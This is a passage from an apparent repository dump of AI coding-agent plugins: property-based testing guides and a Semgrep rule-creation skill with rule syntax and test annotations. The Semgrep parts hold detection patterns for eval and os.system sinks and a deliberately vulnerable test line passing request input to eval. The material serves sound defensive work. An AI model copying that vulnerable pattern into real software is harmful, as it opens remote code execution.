github.com/crytic/medusa@latest\n```\n\nSee [secure-contracts.com](https://secure-contracts.com) for tutorials.\n\n## Installation\n\n**Python**:\n```bash\npip install hypothesis\n```\n\n**JavaScript/TypeScript**:\n```bash\nnpm install fast-check\n```\n\n**Rust** (add to Cargo.toml):\n```toml\n[dev-dependencies]\nproptest = \"1.0\"\n# or for quickcheck:\nquickcheck = \"1.0\"\n```\n\n**Go**:\n```bash\ngo get pgregory.net/rapid\n# or for gopter:\ngo get github.com/leanovate/gopter\n```\n\n**Java** (Maven):\n```xml\n<dependency>\n  <groupId>net.jqwik</groupId>\n  <artifactId>jqwik</artifactId>\n  <version>1.9.3</version>\n  <scope>test</scope>\n</dependency>\n```\n\n**Clojure** (deps.edn):\n```clojure\n{:deps {org.clojure/test.check {:mvn/version \"1.1.2\"}}}\n```\n\n**Haskell**:\n```bash\ncabal install QuickCheck\n# or for Hedgehog:\ncabal install hedgehog\n```\n\n## Detecting Existing Usage\n\nSearch for PBT library imports in the codebase:\n\n```bash\n# Python\nrg \"from hypothesis import\" --type py\n\n# JavaScript/TypeScript\nrg \"from 'fast-check'\" --type js --type ts\n\n# Rust\nrg \"use proptest\" --type rust\n\n# Go\nrg \"pgregory.net/rapid\" --type go\n\n# Java\nrg \"@Property\" --type java\n\n# Clojure\nrg \"test.check\" --type clojure\n\n# Solidity (Echidna)\nrg \"echidna_\" --glob \"*.sol\"\n```\n",
        "plugins/property-based-testing/skills/property-based-testing/references/refactoring.md": "# Refactoring for Property-Based Testing\n\nIdentify code that could be refactored to enable or improve property-based testing.\n\n## Quick Reference\n\n| Pattern | Problem | Solution | Properties Enabled |\n|---------|---------|----------|-------------------|\n| I/O mixed with logic | Can't test without mocks | Extract pure core | Multiple |\n| Encode without decode | No roundtrip possible | Add inverse operation | Roundtrip |\n| Hardcoded config | Can't test edge cases | Inject dependencies | Full coverage |\n| In-place mutation | Hard to verify before/after | Return new value | Comparison properties |\n| String building | Can't verify structure | Structured + render | Roundtrip |\n| Implicit invariants | Can't test constraints | Make explicit with validation | Invariant |\n\n## Refactoring Patterns\n\n### 1. Extract Pure Core from Impure Functions (High Impact)\n\n**Pattern**: Functions that mix I/O with logic\n\n```python\n# BEFORE - hard to test\ndef process_order(order_id: str) -> None:\n    order = db.fetch(order_id)           # I/O\n    discount = calculate_discount(order)  # Pure logic\n    total = apply_discount(order, discount)  # Pure logic\n    db.save(order_id, total)             # I/O\n\n# AFTER - pure core extracted\ndef calculate_order_total(order: Order, rules: DiscountRules) -> Decimal:\n    \"\"\"Pure function - easy to property test.\"\"\"\n    discount = calculate_discount(order, rules)\n    return apply_discount(order, discount)\n\ndef process_order(order_id: str) -> None:\n    \"\"\"Thin I/O wrapper.\"\"\"\n    order = db.fetch(order_id)\n    total = calculate_order_total(order, get_discount_rules())\n    db.save(order_id, total)\n```\n\n**Detection**: `rg \"def \\w+\\(\" -A 20 | grep -E \"(open\\(|db\\.|requests\\.|fetch|save)\"`\n\n### 2. Add Missing Inverse Operations (High Impact)\n\n**Pattern**: One-way operations that should have pairs\n\n```python\n# BEFORE - only encode\ndef encode_message(msg: dict) -> bytes:\n    return msgpack.packb(msg)\n\n# AFTER - add decode for roundtrip testing\ndef encode_message(msg: dict) -> bytes:\n    return msgpack.packb(msg)\n\ndef decode_message(data: bytes) -> dict:\n    return msgpack.unpackb(data)\n```\n\n**Detection**: Find encode without decode, serialize without deserialize\n\n### 3. Replace Hardcoded Dependencies (Medium Impact)\n\n**Pattern**: Functions using globals or hardcoded config\n\n```python\n# BEFORE\ndef validate_input(data: str) -> bool:\n    return len(data) <= CONFIG.max_length\n\n# AFTER - dependencies injected\ndef validate_input(data: str, max_length: int) -> bool:\n    return len(data) <= max_length\n```\n\n**Detection**: `rg \"(CONFIG\\.|SETTINGS\\.|os\\.environ)\"`\n\n### 4. Return Values Instead of Mutating (Medium Impact)\n\n**Pattern**: Methods that mutate in place\n\n```python\n# BEFORE\ndef sort_tasks(tasks: list[Task]) -> None:\n    tasks.sort(key=lambda t: t.priority)\n\n# AFTER - returns new list\ndef sorted_tasks(tasks: list[Task]) -> list[Task]:\n    return sorted(tasks, key=lambda t: t.priority)\n```\n\n**Detection**: `rg \"-> None:\" -A 10 | grep -E \"\\.(sort|append|extend)\"`\n\n### 5. Convert String Building to Structured + Render (Medium Impact)\n\n**Pattern**: Manual string concatenation\n\n```python\n# BEFORE\ndef build_query(table: str, filters: dict) -> str:\n    q = f\"SELECT * FROM {table}\"\n    if filters:\n        q += \" WHERE \" + \" AND \".join(...)\n    return q\n\n# AFTER - structured representation\n@dataclass\nclass Query:\n    table: str\n    filters: dict\n\ndef render_query(q: Query) -> str: ...\ndef parse_query(sql: str) -> Query: ...  # Add inverse!\n```\n\n### 6. Add Validators/Generators for Predicates (Lower Impact)\n\n**Pattern**: `is_valid()` exists but no way to generate valid inputs\n\n```python\n# BEFORE\ndef is_valid_email(s: str) -> bool:\n    return EMAIL_REGEX.match(s) is not None\n\n# AFTER - add generator\n@st.composite\ndef valid_emails(draw):\n    local = draw(st.from_regex(r'[a-z][a-z0-9]{1,20}'))\n    domain = draw(st.sampled_from(['gmail.com', 'example.com']))\n    return f\"{local}@{domain}\"\n```\n\n**Detection**: `rg \"def is_\\w+\\(\" --type py`\n\n### 7. Make Implicit Invariants Explicit (Lower Impact)\n\n**Pattern**: Constraints in comments but not enforced\n\n```python\n# BEFORE - constraint only in docstring\ndef allocate_buffer(size: int) -> bytes:\n    \"\"\"Size must be positive and <= 1MB.\"\"\"\n    return bytes(size)\n\n# AFTER - enforced\nMAX_BUFFER_SIZE = 1024 * 1024\n\ndef allocate_buffer(size: int) -> bytes:\n    if not (0 < size <= MAX_BUFFER_SIZE):\n        raise ValueError(f\"size must be in (0, {MAX_BUFFER_SIZE}]\")\n    return bytes(size)\n```\n\n**Detection**: `rg \"(must be|should be|always|never)\" --type py`\n\n## Evaluation Criteria\n\nFor each refactoring opportunity:\n\n| Factor | Questions |\n|--------|-----------|\n| Properties enabled | What tests become possible? Roundtrip > Idempotence > No crash |\n| Effort | Low/Medium/High - how much code change? |\n| Risk | Breaking changes? API impact? |\n| Backwards compatibility | Can old callers still work? |\n\n## Prioritization\n\n1. Strength of properties enabled (roundtrip > idempotence > no crash)\n2. Effort required (prefer low-effort wins)\n3. Risk level (prefer safe changes)\n\n## Red Flags\n\n- **Breaking the API without warning**: Flag breaking changes clearly and offer backwards-compatible alternatives\n- **Over-engineering**: Not every function needs to be perfectly testable - prioritize high-value code\n- **Ignoring existing tests**: Run existing tests after refactoring to verify behavior unchanged\n- **Missing the forest for the trees**: If a module needs wholesale restructuring, say so rather than suggesting 20 small changes\n- **Not considering effort vs value**: A complex refactoring enabling only \"no crash\" isn't worth it\n",
        "plugins/property-based-testing/skills/property-based-testing/references/reviewing.md": "# Reviewing Property-Based Tests\n\nEvaluate quality of existing property-based tests and suggest improvements.\n\n## Quick Reference\n\n| Issue | Severity | Detection | Fix |\n|-------|----------|-----------|-----|\n| Tautological | CRITICAL | Assertion compares same expression | Rewrite with actual property |\n| Vacuous | CRITICAL | Contradictory `assume()` calls | Remove or fix filters |\n| Weak (no assertion) | HIGH | Test body has no assert | Add meaningful assertion |\n| Reimplementation | HIGH | Assertion mirrors function logic | Use algebraic property instead |\n| Over-filtered | MEDIUM | Many `assume()` calls | Redesign strategy |\n| Missing edge cases | MEDIUM | No `@example` decorators | Add explicit edge cases |\n| Poor settings | LOW | Missing or bad `@settings` | Add appropriate settings |\n\n## Quality Issues\n\n### Issue: Tautological Properties (CRITICAL)\n\nProperties that are always true regardless of implementation.\n\n```python\n# BAD - compares function to itself\n@given(st.lists(st.integers()))\ndef test_sort_tautology(xs):\n    assert sorted(xs) == sorted(xs)  # Always true!\n\n# BAD - tests nothing about the function\n@given(st.integers())\ndef test_useless(x):\n    result = compute(x)\n    assert result == result  # Always true!\n```\n\n**Detection**: Assertions comparing same expression, or not using function result meaningfully.\n\n### Issue: Vacuous Tests (CRITICAL)\n\nTests where assumptions filter out most/all inputs.\n\n```python\n# VACUOUS - impossible condition\n@given(st.integers())\ndef test_vacuous(x):\n    assume(x > 100)\n    assume(x < 50)  # Impossible!\n    assert compute(x) > 0\n\n# VACUOUS - overly restrictive\n@given(st.integers())\ndef test_too_filtered(x):\n    assume(x == 42)  # Only tests one value!\n    assert compute(x) == expected\n```\n\n**Detection**: Multiple `assume()` calls, `assume` with very narrow conditions.\n\n### Issue: Weak Properties (HIGH)\n\nProperties that only test minimal guarantees.\n\n```python\n# WEAK - only tests no crash\n@given(st.text())\ndef test_only_no_crash(s):\n    process(s)  # No assertion at all\n\n# WEAK - only tests type\n@given(st.integers())\ndef test_only_type(x):\n    assert isinstance(compute(x), int)\n```\n\n**Detection**: Tests without assertions, or only `isinstance`/type checks.\n\n### Issue: Reimplementing the Function (HIGH)\n\n```python\n# BAD - just reimplements the logic\n@given(st.integers(), st.integers())\ndef test_reimplements(a, b):\n    assert add(a, b) == a + b  # Tests nothing if add() is just a + b\n```\n\n**Detection**: Test assertion contains same logic as function under test.\n\n### Issue: Poor Input Coverage (MEDIUM)\n\n```python\n# NARROW - misses edge cases\n@given(st.integers(min_value=1, max_value=10))\ndef test_narrow_range(x):\n    assert compute(x) >= 0  # What about 0? Negatives? Large values?\n\n# MISSING - no edge case examples\n@given(st.lists(st.integers()))\ndef test_no_explicit_edges(xs):\n    # Should include @example([]) @example([1]) etc.\n    assert len(sort(xs)) == len(xs)\n```\n\n### Issue: Missing Stronger Properties (MEDIUM)\n\n```python\n# EXISTS - but could be stronger\n@given(st.lists(st.integers()))\ndef test_sort_length(xs):\n    assert len(sort(xs)) == len(xs)\n# MISSING: ordering property, element preservation\n```\n\n### Issue: Poor Settings (LOW)\n\n```python\n# TOO FEW - may miss bugs\n@settings(max_examples=5)\ndef test_few_examples(x): ...\n\n# NO DEADLINE - may hang in CI\n@given(expensive_strategy())\ndef test_no_deadline(x): ...  # Could timeout\n```\n\n## Review Process\n\n### 1. Locate Property-Based Tests\n\nSearch using library-specific patterns:\n\n**Python/Hypothesis:**\n```bash\nrg \"@given\\(\" --type py\nrg \"from hypothesis import\" --type py\n```\n\n**JavaScript/fast-check:**\n```bash\nrg \"fc\\.(assert|property)\" --type js --type ts\n```\n\n**Rust/proptest:**\n```bash\nrg \"proptest!\" --type rust\n```\n\n### 2. Analyze Each Test\n\nCheck for issues above, starting with critical then high severity.\n\n### 3. Evaluate Shrinking Quality\n\nWill tests shrink to minimal counterexamples? Complex strategies may produce hard-to-debug failures.\n\n### 4. Check for Flakiness Potential\n\n- Non-determinism in code under test\n- Time-dependent assertions\n- Global state dependencies\n- Floating point comparisons without tolerance\n\n### 5. Suggest Stronger Properties\n\nCompare against property catalog - are stronger properties available but not tested?\n\n## Test Health Score\n\n| Category | Score | What to Check |\n|----------|-------|---------------|\n| Property Strength | X/5 | Roundtrip > Idempotence > Type > No crash |\n| Input Coverage | X/5 | Edge cases, strategy breadth |\n| Assertions | X/5 | Meaningful, not tautological |\n| Settings | X/5 | Appropriate for context |\n\n## Mutation Testing Verification\n\nSuggest specific mutations to verify tests catch bugs:\n\n```\nTo verify test_sort catches bugs:\n\n1. Return input unchanged: `return xs`\n   - Should fail: test_ordering\n\n2. Drop last element: `return sorted(xs)[:-1]`\n   - Should fail: test_length_preserved\n\n3. Reverse order: `return sorted(xs, reverse=True)`\n   - Should fail: test_ordering\n```\n\n## Quality Checklist\n\nFor each test, verify:\n- [ ] Not tautological (assertion doesn't compare same expression)\n- [ ] Strong assertion (not just \"no crash\")\n- [ ] Not vacuous (inputs not over-filtered)\n- [ ] Good coverage (edge cases via `@example`)\n- [ ] No reimplementation of function logic\n- [ ] Appropriate settings for context\n- [ ] Good shrinking potential\n- [ ] Deterministic (no flakiness risk)\n\n## Red Flags\n\n- **Marking tautologies as \"fine\"**: `assert x == x` is NEVER a valid test\n- **Accepting \"no crash\" as sufficient**: Always push for stronger properties\n- **Ignoring vacuous tests**: Tests with contradictory `assume()` provide false confidence\n- **Not checking for reimplementation**: `assert add(a,b) == a + b` tests nothing if that's how `add` is implemented\n",
        "plugins/property-based-testing/skills/property-based-testing/references/strategies.md": "# Input Strategy Reference\n\n## Python/Hypothesis\n\n| Type | Strategy |\n|------|----------|\n| `int` | `st.integers()` |\n| `float` | `st.floats(allow_nan=False)` |\n| `str` | `st.text()` |\n| `bytes` | `st.binary()` |\n| `bool` | `st.booleans()` |\n| `list[T]` | `st.lists(strategy_for_T)` |\n| `dict[K, V]` | `st.dictionaries(key_strategy, value_strategy)` |\n| `set[T]` | `st.frozensets(strategy_for_T)` |\n| `tuple[T, ...]` | `st.tuples(strategy_for_T, ...)` |\n| `Optional[T]` | `st.none() \\| strategy_for_T` |\n| `Union[A, B]` | `st.one_of(strategy_a, strategy_b)` |\n| Custom class | `st.builds(ClassName, field1=..., field2=...)` |\n| Enum | `st.sampled_from(EnumClass)` |\n| Constrained int | `st.integers(min_value=0, max_value=100)` |\n| Email | `st.emails()` |\n| UUID | `st.uuids()` |\n| DateTime | `st.datetimes()` |\n| Regex match | `st.from_regex(r\"pattern\")` |\n\n### Composite Strategies\n\nFor complex types, use `@st.composite`:\n\n```python\n@st.composite\ndef valid_users(draw):\n    name = draw(st.text(min_size=1, max_size=50))\n    age = draw(st.integers(min_value=0, max_value=150))\n    email = draw(st.emails())\n    return User(name=name, age=age, email=email)\n```\n\n## JavaScript/fast-check\n\n| Type | Strategy |\n|------|----------|\n| number | `fc.integer()` or `fc.float()` |\n| string | `fc.string()` |\n| boolean | `fc.boolean()` |\n| array | `fc.array(itemArb)` |\n| object | `fc.record({...})` |\n| optional | `fc.option(arb)` |\n\n### Example\n\n```typescript\nconst userArb = fc.record({\n  name: fc.string({ minLength: 1, maxLength: 50 }),\n  age: fc.integer({ min: 0, max: 150 }),\n  email: fc.emailAddress(),\n});\n```\n\n## Rust/proptest\n\n| Type | Strategy |\n|------|----------|\n| i32, u64, etc | `any::<i32>()` |\n| String | `any::<String>()` or `\"[a-z]+\"` (regex) |\n| Vec<T> | `prop::collection::vec(strategy, size)` |\n| Option<T> | `prop::option::of(strategy)` |\n\n### Example\n\n```rust\nproptest! {\n    #[test]\n    fn test_roundtrip(s in \"[a-z]{1,20}\") {\n        let encoded = encode(&s);\n        let decoded = decode(&encoded)?;\n        prop_assert_eq!(s, decoded);\n    }\n}\n```\n\n## Go/rapid\n\n```go\nrapid.Check(t, func(t *rapid.T) {\n    s := rapid.String().Draw(t, \"s\")\n    n := rapid.IntRange(0, 100).Draw(t, \"n\")\n    // test with s and n\n})\n```\n\n## Best Practices\n\n1. **Constrain early**: Build constraints into strategy, not `assume()`\n   ```python\n   # GOOD\n   st.integers(min_value=1, max_value=100)\n\n   # BAD\n   st.integers().filter(lambda x: 1 <= x <= 100)\n   ```\n\n2. **Size limits**: Use `max_size` to prevent slow tests\n   ```python\n   st.lists(st.integers(), max_size=100)\n   st.text(max_size=1000)\n   ```\n\n3. **Realistic data**: Make strategies match real-world constraints\n   ```python\n   # Real user ages, not arbitrary integers\n   st.integers(min_value=0, max_value=150)\n   ```\n\n4. **Reuse strategies**: Define once, use across tests\n   ```python\n   valid_users = st.builds(User, ...)\n\n   @given(valid_users)\n   def test_one(user): ...\n\n   @given(valid_users)\n   def test_two(user): ...\n   ```\n",
        "plugins/semgrep-rule-creator/.claude-plugin/plugin.json": "{\n  \"name\": \"semgrep-rule-creator\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Create custom Semgrep rules for detecting bug patterns and security vulnerabilities\",\n  \"author\": {\n    \"name\": \"Maciej Domanski\"\n  }\n}\n",
        "plugins/semgrep-rule-creator/README.md": "# Semgrep Rule Creator\n\nCreate production-quality Semgrep rules for detecting bug patterns and security vulnerabilities.\n\n**Author:** Maciej Domanski\n\n## Skills Included\n\n| Skill                 | Purpose                                              |\n|-----------------------|------------------------------------------------------|\n| `semgrep-rule-creator` | Guide creation of custom Semgrep rules with testing |\n\n## When to Use\n\nUse this skill when you need to:\n- Create custom Semgrep rules for detecting specific bug patterns\n- Write rules for security vulnerability detection\n- Build taint mode rules for data flow analysis\n- Develop pattern matching rules for code quality checks\n\n## What It Does\n\n- Guides test-driven rule development (write tests first, then iterate)\n- Analyzes AST structure to help craft precise patterns\n- Supports both taint mode (data flow) and pattern matching approaches\n- Includes comprehensive reference documentation from Semgrep docs\n- Provides common vulnerability patterns by language\n\n## Prerequisites\n\n- [Semgrep](https://semgrep.dev/docs/getting-started/) installed (`pip install semgrep` or `brew install semgrep`)\n\n## Installation\n\n```\n/plugin install trailofbits/skills/plugins/semgrep-rule-creator\n```\n\n## Related Skills\n\n- `semgrep-rule-variant-creator` - Port existing Semgrep rules to new target languages\n- `static-analysis` - General static analysis toolkit with Semgrep, CodeQL, and SARIF parsing\n- `variant-analysis` - Find similar vulnerabilities across codebases\n",
        "plugins/semgrep-rule-creator/commands/semgrep-rule.md": "---\nname: trailofbits:semgrep-rule\ndescription: Creates Semgrep rules with test-first methodology\nargument-hint: \"(uses conversation context for detection pattern)\"\nallowed-tools:\n  - Bash\n  - Read\n  - Write\n  - Edit\n  - Glob\n  - Grep\n  - WebFetch\n---\n\n# Create Semgrep Rule\n\n**Arguments:** $ARGUMENTS\n\nThis command is context-driven. Use conversation context to understand:\n1. The vulnerability or pattern to detect\n2. The target language\n3. Whether taint mode is appropriate\n\nIf context is unclear, ask for a description of the pattern to detect.\n\nInvoke the `semgrep-rule-creator` skill for the full workflow.\n",
        "plugins/semgrep-rule-creator/skills/semgrep-rule-creator/SKILL.md": "---\nname: semgrep-rule-creator\ndescription: Creates custom Semgrep rules for detecting security vulnerabilities, bug patterns, and code patterns. Use when writing Semgrep rules or building custom static analysis detections.\nallowed-tools:\n  - Bash\n  - Read\n  - Write\n  - Edit\n  - Glob\n  - Grep\n  - WebFetch\n---\n\n# Semgrep Rule Creator\n\nCreate production-quality Semgrep rules with proper testing and validation.\n\n## When to Use\n\n**Ideal scenarios:**\n- Writing Semgrep rules for specific bug patterns\n- Writing rules to detect security vulnerabilities in your codebase\n- Writing taint mode rules for data flow vulnerabilities\n- Writing rules to enforce coding standards\n\n## When NOT to Use\n\nDo NOT use this skill for:\n- Running existing Semgrep rulesets\n- General static analysis without custom rules (use `static-analysis` skill)\n\n## Rationalizations to Reject\n\nWhen writing Semgrep rules, reject these common shortcuts:\n\n- **\"The pattern looks complete\"**  Still run `semgrep --test --config <rule-id>.yaml <rule-id>.<ext>` to verify. Untested rules have hidden false positives/negatives.\n- **\"It matches the vulnerable case\"**  Matching vulnerabilities is half the job. Verify safe cases don't match (false positives break trust).\n- **\"Taint mode is overkill for this\"**  If data flows from user input to a dangerous sink, taint mode gives better precision than pattern matching.\n- **\"One test is enough\"**  Include edge cases: different coding styles, sanitized inputs, safe alternatives, and boundary conditions.\n- **\"I'll optimize the patterns first\"**  Write correct patterns first, optimize after all tests pass. Premature optimization causes regressions.\n- **\"The AST dump is too complex\"**  The AST reveals exactly how Semgrep sees code. Skipping it leads to patterns that miss syntactic variations.\n\n## Anti-Patterns\n\n**Too broad** - matches everything, useless for detection:\n```yaml\n# BAD: Matches any function call\npattern: $FUNC(...)\n\n# GOOD: Specific dangerous function\npattern: eval(...)\n```\n\n**Missing safe cases in tests** - leads to undetected false positives:\n```python\n# BAD: Only tests vulnerable case\n# ruleid: my-rule\ndangerous(user_input)\n\n# GOOD: Include safe cases to verify no false positives\n# ruleid: my-rule\ndangerous(user_input)\n\n# ok: my-rule\ndangerous(sanitize(user_input))\n\n# ok: my-rule\ndangerous(\"hardcoded_safe_value\")\n```\n\n**Overly specific patterns** - misses variations:\n```yaml\n# BAD: Only matches exact format\npattern: os.system(\"rm \" + $VAR)\n\n# GOOD: Matches all os.system calls with taint tracking\nmode: taint\npattern-sinks:\n  - pattern: os.system(...)\n```\n\n## Strictness Level\n\nThis workflow is **strict** - do not skip steps:\n- **Read documentation first**: See [Documentation](#documentation) before writing Semgrep rules\n- **Test-first is mandatory**: Never write a rule without tests\n- **100% test pass is required**: \"Most tests pass\" is not acceptable\n- **Optimization comes last**: Only simplify patterns after all tests pass\n- **Avoid generic patterns**: Rules must be specific, not match broad patterns\n- **Prioritize taint mode**: For data flow vulnerabilities\n\n## Overview\n\nThis skill guides creation of Semgrep rules that detect security vulnerabilities and code patterns. Rules are created iteratively: analyze the problem, write tests first, analyze AST structure, write the rule, iterate until all tests pass, optimize the rule.\n\n**Approach selection:**\n- **Taint mode** (prioritize): Data flow issues where untrusted input reaches dangerous sinks\n- **Pattern matching**: Simple syntactic patterns without data flow requirements\n\n**Why prioritize taint mode?** Pattern matching finds syntax but misses context. A pattern `eval($X)` matches both `eval(user_input)` (vulnerable) and `eval(\"safe_literal\")` (safe). Taint mode tracks data flow, so it only alerts when untrusted data actually reaches the sinkdramatically reducing false positives for injection vulnerabilities.\n\n**Iterating between approaches:** It's okay to experiment. If you start with taint mode and it's not working well (e.g., taint doesn't propagate as expected, too many false positives/negatives), switch to pattern matching. Conversely, if pattern matching produces too many false positives on safe cases, try taint mode instead. The goal is a working rulenot rigid adherence to one approach.\n\n**Output structure** - exactly 2 files in a directory named after the rule-id:\n```\n<rule-id>/\n <rule-id>.yaml     # Semgrep rule\n <rule-id>.<ext>    # Test file with ruleid/ok annotations\n```\n\n## Quick Start\n\n```yaml\nrules:\n  - id: insecure-eval\n    languages: [python]\n    severity: HIGH\n    message: User input passed to eval() allows code execution\n    mode: taint\n    pattern-sources:\n      - pattern: request.args.get(...)\n    pattern-sinks:\n      - pattern: eval(...)\n```\n\nTest file (`insecure-eval.py`):\n```python\n# ruleid: insecure-eval\neval(request.args.get('code'))\n\n# ok: insecure-eval\neval(\"print('safe')\")\n```\n\nRun tests (from rule directory): `semgrep --test --config <rule-id>.yaml <rule-id>.<ext>`\n\n## Quick Reference\n\n- For commands, pattern operators, and taint mode syntax, see [quick-reference.md]({baseDir}/references/quick-reference.md).\n- For detailed workflow and examples, see [workflow.md]({baseDir}/references/workflow.md)\n\n## Workflow\n\nCopy this checklist and track progress:\n\n```\nSemgrep Rule Progress:\n- [ ] Step 1: Analyze the problem (read documentation, determine approach)\n- [ ] Step 2: Write tests first (create directory, add test annotations)\n- [ ] Step 3: Analyze AST structure (semgrep --dump-ast)\n- [ ] Step 4: Write the rule\n- [ ] Step 5: Iterate until all tests pass (semgrep --test)\n- [ ] Step 6: Optimize the rule (remove redundancies, re-test)\n```\n\n### 1. Analyze the Problem\n\nUnderstand the bug pattern, identify the target language, determine if taint mode applies.\n\nBefore writing any rule, see [Documentation](#documentation) for required reading.\n\n### 2. Write Tests First\n\n**Why test-first?** Writing tests before the rule forces you to think about both vulnerable AND safe cases. Rules written without tests often have hidden false positives (matching safe cases) or false negatives (missing vulnerable variants). Tests make these visible immediately.\n\nCreate directory and test file with annotations (`# ruleid:`, `# ok:`, etc.). See [quick-reference.md]({baseDir}/references/quick-reference.md#test-file-annotations) for full syntax.\n\nThe annotation line must contain ONLY the comment marker and annotation (e.g., `# ruleid: my-rule`). No other text, comments, or code on the same line.\n\n### 3. Analyze AST (Abstract Syntax Tree) Structure\n\n**Why analyze AST?** Semgrep matches against the AST, not raw text. Code that looks similar may parse differently (e.g., `foo.bar()` vs `foo().bar`). The AST dump shows exactly what Semgrep sees, preventing patterns that fail due to unexpected tree structure.\n\n```bash\nsemgrep --dump-ast -l <language> <rule-id>.<ext>\n```\n\n### 4. Write the Rule\n\nSee [workflow.md]({baseDir}/references/workflow.md) for detailed patterns and examples.\n\n### 5. Iterate Until Tests Pass\n\n```bash\nsemgrep --test --config <rule-id>.yaml <rule-id>.<ext>\n```\n\nFor debugging taint mode rules:\n```bash\nsemgrep --dataflow-traces -f <rule-id>.yaml <rule-id>.<ext>\n```\n\n**Verification checkpoint**: Output MUST show \"All tests passed\". **Only proceed when validation passes**.\n\n### 6. Optimize the Rule\n\nAfter all tests pass, remove redundant patterns (quote variants, ellipsis subsets). See [workflow.md]({baseDir}/references/workflow.md#step-6-optimize-the-rule) for detailed optimization examples and checklist.\n\n**Task complete ONLY when**: All tests pass after optimization.\n\n\n## Documentation\n\n**REQUIRED**: Before writing any rule, use WebFetch to read **all** of these 4 links with Semgrep documentation:\n\n1. [Rule Syntax](https://semgrep.dev/docs/writing-rules/rule-syntax) - YAML structure, operators, and rule options\n2. [Pattern Syntax](https://semgrep.dev/docs/writing-rules/pattern-syntax) - Pattern matching, metavariables, and ellipsis usage\n3. [ToB Testing Handbook - Semgrep](https://appsec.guide/docs/static-analysis/semgrep/advanced/) - Patterns, taint tracking, and practical examples\n4. [Writing Rules Index](https://github.com/semgrep/semgrep-docs/tree/main/docs/writing-rules/) - Full documentation index (browse for taint mode, testing, etc.)\n",
        "plugins/semgrep-rule-creator/skills/semgrep-rule-creator/references/quick-reference.md": "# Semgrep Rule Quick Reference\n\n## Required Rule Fields\n\n```yaml\nrules:\n  - id: rule-id          # Unique identifier (lowercase, hyphens)\n    languages:                 # Target language(s)\n      - python\n    severity: HIGH            # LOW, MEDIUM, HIGH, CRITICAL (ERROR/WARNING/INFO are legacy)\n    message: Description      # Shown when rule matches\n    pattern: code(...)        # OR use patterns/pattern-either/mode:taint\n```\n\n## Pattern Operators\n\n### Basic Matching\n```yaml\npattern: foo(...)              # Match function call\npatterns:                      # AND - all must match\n  - pattern: $X\n  - pattern-not: safe($X)\npattern-either:                # OR - any can match\n  - pattern: foo(...)\n  - pattern: bar(...)\npattern-regex: ^foo.*bar$      # PCRE2 regex matching (multiline mode)\n```\n\n### Metavariables\n- `$VAR` - Match any single expression\n  - **Must be uppercase**: `$X`, `$FUNC`, `$VAR_1` (NOT `$x`, `$var`)\n- `$_` - Anonymous metavariable (matches but doesn't bind)\n- `$...VAR` - Match zero or more arguments (ellipsis metavariable)\n- `...` - Ellipsis, match anything in between\n\n### Deep Expression Matching\n```yaml\n<... $EXPR ...>               # Recursively match pattern in nested expressions\n```\n\n### Scope Operators\n```yaml\npattern-inside: |              # Must be inside this pattern\n  def $FUNC(...):\n    ...\npattern-not-inside: |          # Must NOT be inside this pattern\n  with $CTX:\n    ...\n```\n\n### Negation\n```yaml\npattern-not: safe(...)         # Exclude this pattern\npattern-not-regex: ^test_      # Exclude by regex\n```\n\n### Metavariable Filters\n```yaml\nmetavariable-regex:\n  metavariable: $FUNC\n  regex: (unsafe|dangerous).*\n\nmetavariable-pattern:\n  metavariable: $ARG\n  pattern: request.$X\n\nmetavariable-comparison:\n  metavariable: $NUM\n  comparison: $NUM > 1024\n```\n\n### Focus\n```yaml\nfocus-metavariable: $TARGET    # Report finding on this metavariable only\n```\n\n## Taint Mode\n\n```yaml\nrules:\n  - id: taint-rule\n    mode: taint\n    languages: [python]\n    severity: HIGH\n    message: Tainted data reaches sink\n    pattern-sources:\n      - pattern: user_input()\n      - pattern: request.args.get(...)\n    pattern-sinks:\n      - pattern: eval(...)\n      - pattern: os.system(...)\n    pattern-sanitizers:           # Optional\n      - pattern: sanitize(...)\n      - pattern: escape(...)\n```\n\n### Taint Options\n```yaml\npattern-sources:\n  - pattern: source(...)\n    exact: true                   # Only exact match is source (default: false)\n    by-side-effect: true          # Taints variable by side effect\n\npattern-sanitizers:\n  - pattern: sanitize($X)\n    exact: true                   # Only exact match (default: false)\n    by-side-effect: true          # Sanitizes by side effect\n\npattern-sinks:\n  - pattern: sink(...)\n    exact: false                  # Subexpressions also sinks (default: true)\n```\n\n## Test File Annotations\n\n```python\n# ruleid: rule-id\nvulnerable_code()              # This line MUST match\n\n# ok: rule-id\nsafe_code()                    # This line MUST NOT match\n\n# todoruleid: rule-id\nfuture_detection()             # Known limitation, should match later\n\n# todook: rule-id\nfuture_fp_fix()                # Known FP, should not match later\n```\n\nDO NOT use multi-line comments for test annotations, for example:\n/* ruleid: ... */\n\n## Debugging Commands\n\n```bash\n# Test rules\nsemgrep --test --config <rule-id>.yaml <rule-id>.<ext>\n\n# Validate YAML syntax\nsemgrep --validate --config <rule-id>.yaml\n\n# Run with dataflow traces (for taint mode rules)\nsemgrep --dataflow-traces -f <rule-id>.yaml <rule-id>.<ext>\n\n# Dump AST to understand code structure\nsemgrep --dump-ast -l <language> <rule-id>.<ext>\n\n# Run single rule\nsemgrep -f <rule-id>.yaml <rule-id>.<ext>\n```\n\n## Troubleshooting\n\n### Common Pitfalls\n\n1. **Wrong annotation line**: `ruleid:` must be on the line IMMEDIATELY BEFORE the finding. No other text or code\n2. **Too generic patterns**: Avoid `pattern: $X` without constraints\n3. **YAML syntax errors**: Validate with `semgrep --validate`\n\n### Pattern Not Matching\n\n1. Check AST structure: `semgrep --dump-ast -l <language> <rule-id>.<ext>`\n2. Verify metavariable binding\n3. Check for whitespace/formatting differences\n4. Try more general pattern first, then narrow down\n\n### Taint Not Propagating\n\n1. Use `--dataflow-traces` to see flow\n2. Check if sanitizer is too broad\n3. Verify source pattern matches\n4. Check sink focus-metavariable\n\n### Too Many False Positives\n\n1. Add `pattern-not` for safe cases\n2. Add sanitizers for validation functions\n3. Use `pattern-inside` to limit scope\n4. Use `metavariable-regex` to filter\n\n",
